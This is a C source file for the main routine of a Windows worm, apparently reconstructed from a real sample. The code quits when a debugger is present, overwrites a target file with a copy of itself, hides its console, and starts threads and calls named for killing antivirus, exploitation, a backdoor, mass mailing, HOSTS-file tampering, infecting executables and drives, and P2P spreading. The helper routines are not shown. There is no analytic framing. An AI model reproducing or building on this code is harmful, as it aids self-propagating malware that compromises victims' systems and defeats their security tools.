#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv, char **env)
{
    BOOL is_debugger_present;
    int result;
    DWORD last_error;
    HWND hWnd;
    CHAR local_110[256];

    is_debugger_present = IsDebuggerPresent();
    if (is_debugger_present == 0) {
        if (argc == 2) {
            GetModuleFileNameA(NULL, local_110, sizeof(local_110));
            if (strcmp(argv[1], local_110) != 0) {
                SetFileAttributesA(argv[1], FILE_ATTRIBUTE_NORMAL);
                CopyFileA(local_110, argv[1], FALSE);
            }
        }
        CreateMutexA(NULL, FALSE, "Wer45bbrtb439");
        last_error = GetLastError();
        if (last_error == ERROR_ALREADY_EXISTS) {
            result = 1;
        } else {
            AllocConsole();
            hWnd = FindWindowA("ConsoleWindowClass", NULL);
            ShowWindow(hWnd, SW_HIDE);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_AntiVirusTerminate, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ExploitMain, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_FileBackdoor, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_MassMailMain, NULL, 0, NULL);
            _Install();
            _HOSTSFile();
            _InfectExes();
            p2p_spread();
            InfectDrives();
            result = 0;
        }
    } else {
        result = 1;
    }
    return result;
}
